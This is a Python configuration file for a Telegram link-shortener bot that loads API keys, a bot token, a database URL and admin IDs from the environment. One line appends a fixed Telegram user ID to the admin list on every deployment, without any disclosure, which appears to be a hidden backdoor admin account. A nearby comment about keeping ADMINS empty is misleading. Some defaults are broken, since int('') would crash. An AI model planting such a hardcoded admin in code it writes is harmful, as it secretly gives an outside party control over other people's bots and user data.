import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
BASE_SITE = os.environ.get("BASE_SITE", "runurl.in")

API_ID = int(os.environ.get("API_ID", "")) #API ID from https://my.telegram.org/auth
API_HASH = os.environ.get("API_HASH", "") #API Hash from https://my.telegram.org/auth
BOT_TOKEN = os.environ.get("BOT_TOKEN", "") # Bot token from @BotFather

ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split(",")] if os.environ.get("ADMINS") else [] #Keep thia empty otherwise bot will not work for owner.
ADMIN = ADMINS

DATABASE_NAME = os.environ.get("DATABASE_NAME", "Greylinks")
DATABASE_URL = os.environ.get("DATABASE_URL", "") # mongodb uri from https://www.mongodb.com/

OWNER_ID =  int(os.environ.get("OWNER_ID", "")) # id of the owner
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(6390495622)

#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "")) # log channel for information about users
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", 'https://telegra.ph/file/19eeb26fa2ce58765917a.jpg') # image when someone hit /start
LINK_BYPASS = "True" 


"""
Author: StupidBoi
Telegram: https://t.me/StupidBoi69
"""
